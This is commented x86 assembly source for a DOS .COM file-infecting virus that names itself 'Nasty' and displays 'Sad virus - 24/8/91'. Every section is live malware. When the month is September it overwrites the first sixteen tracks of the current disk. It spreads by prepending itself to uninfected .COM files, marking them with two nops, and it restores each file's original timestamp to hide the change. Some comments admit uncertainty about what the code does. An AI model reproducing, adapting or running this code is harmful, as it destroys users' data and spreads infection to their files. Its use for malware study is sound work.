;
; ---- Data Segment Values ----
; ds:[0f6h] = read buffer location
; ds:[0f8h] = write buffer location
; ds:[0fah] = store length of virus at this location
; ds:[0fch] = store length of file to be infected at this location
; ds:[0feh] = filename of file to infect
;
 
.model tiny
.code
org     100h               ; origin for .com files
start:
 
   nop                     ; these two nop instructs will be used by 'Nasty'
   nop                     ; to determine if a file is already infected
 
   ;******
   ;get date
   ;******
   mov ah,2ah              ; get the date
   int 21h                 ; do it
   cmp dh,09h              ; is it September?
   jnz do_not_activate     ; if NO jmp do_not_activate
   ;****
   ;the nasty bit
   ;****
   ;*
   ;* 1. Print message
   ;*
   lea dx,mess             ; print message
   mov ah,09               ; 'Nasty in September'
   int 21h                 ; do it
   ;****
   ;* 2. Destroy disk
   ;****
   mov ah,19h              ; get current drive (returned in al)
   int 21h                 ; do it
   mov dl,al               ; dl = drive # to be formated
   mov ah,05               ; disk format function
   mov cl,01               ; first sector
   mov ch,00               ; first track
   mov dh,00               ; head zero
   mov al,10h              ; 10h (16) sectors - 2 tracks
   int 13h                 ; do it (overwrite first 16 tracks on currently
                           ;   selected disc)
 
 
do_not_activate:
   mov cx,80h              ; save parameters; set counter to 80h bytes
   mov si,0080h            ; offset in the current data segment of the byte
                           ;   to be copied
   mov di,0ff7fh           ; offset to which byte is to be moved
   rep movsb               ; move bytes until cx=0 (decrement cx by 1 each time
                           ;   loop is performed is done automatically)
                           ;   (increment by 1 of si & di is done automatically)
 
   lea ax,begp             ; load exit from program offset address into ax
   mov cx,ax               ;  "    "    "     "       "      "      "   cx
   sub ax,100h             ; subtract start of .com file address (100h) from ax
                           ;   ax now contains the length of the virus
 
   mov ds:[0fah],ax        ; put length of the virus into the data segment at
                           ;   offset 0fah
   add cx,fso              ; add fso (5h) to cx (offset address of exit)
                           ;   so, cx=cx+5
   mov ds:[0f8h],cx        ; move cx (end of virus + 5) into data segment at
                           ;   offset 0f8h. ** Start of the write buffer.
   ADD CX,AX               ; add virus length (ax) to cx ?????
   mov ds:[0f6h],cx        ; mov cx into data segment at offset 0f6h.
                           ;   ** Start of the read buffer
   mov cx,ax               ; mov length of virus into cx
   lea si,start            ; load address of 'start' (start of virus) into
                           ;   souce index
   mov di,ds:[0f8h]        ; mov the value of the write buffer (@ 0f8h) into
                           ;   destination index
 
 
rb:                        ; cx = counter (length of virus)
                           ; si = offset of byte to be read
                           ; di = offset of where to write byte to
                           ; (auto decrement of cx & increment of si & di)
   rep movsb               ; copy the virus into memory
 
   stc                     ; set the carry flag
 
   lea dx,file_type_to_infect     ; set infector for .com files only
   mov ah,4eh                     ; find first file with specified params
   mov cx,20h                     ; files with archive bit set
   int 21h                        ; do it
                                  ; if file found, CF is cleared, else
                                  ;   CF is set
 
   or ax,ax                ; works the below instructions (jz & jmp)
   jz file_found           ; if file found jmp file_found
   jmp done                ; if no file found, jmp done (exit virus)
 
file_found:
   mov ah,2fh              ; get dta (returned in es:bx)
   int 21h                 ; do it
 
   mov ax,es:[bx+1ah]      ; mov size of file to be infected into ax
   mov ds:[0fch],ax        ; mov filesize into ds:[0fch]
   add bx,1eh              ; bx now points to asciz filename
   mov ds:[0feh],bx        ; mov filename into ds:[0feh]
   clc                     ; clear carry flag
 
   mov ax,3d02h            ; open file for r/w (ds:dx -> asciz filename)
   mov dx,bx               ; mov filename into dx
   int 21h                 ; do it (ax contains file handle)
 
   mov bx,ax               ; mov file handle into bx
 
   mov ax,5700h            ; get time & date attribs from file to infect
   int 21h                 ; do it (file handle in bx)
   push cx                 ; save time to the stack
   push dx                 ; save date to the stack
 
   mov ah,3fh              ; read from file to be infected
   mov cx,ds:[0fch]        ; number of bytes to be read (filesize of file to
                           ;   be infected
   mov dx,ds:[0f6h]        ; buffer (where to read bytes to)
   int 21h                 ; do it
 
   mov bx,dx               ; mov buffer location to bx
   mov ax,[bx]             ; mov contents of bx (first two bytes - as bx is
                           ;   16-bits) into ax.
 
                           ; Now check to see if file is infected... if the
                           ;    file is infected, it's first two bytes will be
                           ;    9090h (nop nop)
 
   sub ax,9090h            ; If file is already infected, zero flag will be set
                           ;   thus jump to fin(ish)
   jz fin
 
 
   mov ax,ds:[0fch]        ; mov filesize of file to be infected into ax
   mov bx,ds:[0f6h]        ; mov where-to-read-to buffer into bx
 
   mov [bx-2],ax      ; correct old len
 
   mov ah,3ch              ; Create file with handle
   mov cx,00h              ; cx=attribs -- set no attributes
   mov dx,ds:[0feh]        ; point to name
   clc                     ; clear carry flag
   int 21h                 ; create file
                           ; Note: If filename already exists, (which it does)
                           ;   truncate the filelength to zero - this is ok as
                           ;   we have already copied the file to be infected
                           ;   into memory.
 
   mov bx,ax               ; mov file handle into bx
   mov ah,40h              ; write file with handle (write to the file to be
                           ;   infected) - length currently zero
                           ;   cx=number of bytes to write
   mov cx,ds:[0fch]        ; length of file to be infected
   add cx,ds:[0fah]        ; length of virus
   mov DX,ds:[0f8h]        ; location of write buffer (this contains the virus
                           ;   + the file to be infected)
   int 21h                 ; write file
                           ; new file = virus + file to be infected
 
   mov ax,5701h            ; restore original time & date values
   pop dx                  ; get old date from the stack
   pop cx                  ; get old time from the stack
   int 21h                 ; do it
                           ; Note: Infected file will now carry the time & date
                           ;   it had before the infection.
 
   mov ah,3eh              ; close file (bx=file handle)
   int 21h                 ; do it
                           ; Note: date & time stamps automatically updated if
                           ;   file written to.
 
fin:
   stc                     ; set carry flags
   mov ah,4fh              ; find next file (.com)
   int 21h                 ; do it
   or ax,ax                ; decides zero flag outcome
   jnz done                ; if no more .com files, jmp done
   JMP file_found          ;   else begin re-infection process for new file.
 
done:
   mov cx,80h              ; set counter (cx) = 80h
   mov si,0ff7fh           ; source offset address (copy from here)
   mov di,0080h            ; destination offset address (copy to here)
   rep movsb               ; copy bytes! (cx is auto decremented by 1
                           ;   si & di are auto incremented by 1)
                           ; Note: this is a 'restore parameters' feature
                           ;   this does the reverse of what what done earlier
                           ;   in the program (do_not_activate:)
 
   mov ax,0a4f3h           ;
   mov ds:[0fff9h],ax      ;
   mov al,0eah             ;
   mov ds:[0fffbh],al      ; reset data segment locations ??? (to previous
   mov ax,100h             ;   values before virus infection)
   mov ds:[0fffch],ax      ;
   lea si,begp             ; load exit from program offset address into si
   lea di,start            ; load offset address of start of virus into di
   mov ax,cs
   mov ds:[0fffeh],ax      ; re-align cs = ds ???
   mov kk,ax
   mov cx,fso
 
   db 0eah                 ; define byte
   dw 0fff9h               ; define word
   kk dw 0000h             ; define kk = word
 
   mess db 'Sad virus - 24/8/91',13,10,'$'    ; virus message to display
 
   file_type_to_infect db '*?.com',0         ; infect only .com files.
 
   fso dw 0005h            ; store 5 into 'fso'. dw means that fso is 2 bytes
                           ;   in size (a word)
                           ; ----- alma mater
 
 
begp:
   mov     ax,4c00h        ; normal dos termination (set al to 00)
   int     21h             ; do it
 
end start
 